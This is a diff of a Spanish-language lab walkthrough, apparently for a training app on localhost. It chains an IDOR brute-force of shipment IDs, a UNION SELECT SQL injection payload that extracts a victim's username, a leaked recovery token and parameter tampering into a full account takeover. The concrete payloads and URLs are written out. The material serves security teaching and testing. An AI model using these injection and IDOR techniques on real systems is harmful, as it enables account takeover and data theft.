@@ -50,27 +50,26 @@ PASO 1 — Login como atacante (crea la cookie SSO)
 
 PASO 2 — IDOR: ver el envio de la victima  [Vulnerabilidad A01]
   Navegar al propio envio:
-    http://localhost:5001/tracking?shipment_id=4829163
+    http://localhost:5001/tracking?shipment_id=666
   Ver que muestra el envio del atacante.
 
-  Cambiar el ID en la URL al de la victima:
-    http://localhost:5001/tracking?shipment_id=3847291
-  Resultado esperado: datos de Carlos Gomez (nombre, email, orden) sin ser el dueno del envio.
+  Cambiar el ID en la URL al de la victima (fuerza bruta: barrido desde 666 hacia arriba):
+    http://localhost:5001/tracking?shipment_id=692
+  Resultado esperado: datos de Carlos Gomez (nombre, ID de cliente, orden) sin ser el dueno del envio.
 
-  Dato obtenido: user_id = 1, email = carlos.gomez@gmail.com
+  Dato obtenido: ID de cliente = 204815  (el detalle no muestra el email)
 
   Por que funciona: el servidor valida que haya sesion activa pero no verifica
   que el shipment_id pertenezca al usuario autenticado.
 
 
 PASO 3 — SQL Injection: extraer el username  [Vulnerabilidad A05]
-  Busqueda normal con el email obtenido en el paso anterior:
-    http://localhost:5001/
-  Ingresar en el campo de busqueda: carlos.gomez@gmail.com
-  Devuelve: el envio de Carlos Gomez (resultado normal).
+  Busqueda normal con el ID de cliente obtenido:
+    http://localhost:5001/support/search?user_id=204815
+  Devuelve: 204815, Carlos, Gomez  (sin email ni username)
 
   Ahora inyectar en el mismo campo de busqueda:
-    carlos.gomez@gmail.com' UNION SELECT id,username,first_name,last_name,email FROM users WHERE email='carlos.gomez@gmail.com'--
+    204815 UNION SELECT id,username,first_name,last_name,email FROM users WHERE email='carlos.gomez@gmail.com'--
   Resultado esperado: aparece una segunda fila donde la columna "Orden" muestra "carlos_gomez".
 
   Dato obtenido: username = carlos_gomez
@@ -124,7 +123,7 @@ RESULTADO FINAL
 ---------------
 El atacante tiene acceso total a la cuenta de carlos_gomez.
 La cadena completa uso 4 vulnerabilidades encadenadas:
-  A01 (IDOR)     -> user_id y email de la victima
+  A01 (IDOR)     -> ID de cliente de la victima
   A05 (SQLi)     -> username de la victima
   A02 (Misconfig)-> token de recuperacion en la respuesta
   A08 (Tampering)-> acceso a la cuenta sin conocer la contrasena
@@ -138,5 +137,5 @@ Portal de Clientes (localhost:5000):
 
 Portal de Seguimiento (localhost:5001):
   (sin login propio, usa la cookie SSO del portal de clientes)
-  shipment victima:   3847291
-  shipment atacante:  4829163
+  shipment victima:   692
+  shipment atacante:  666
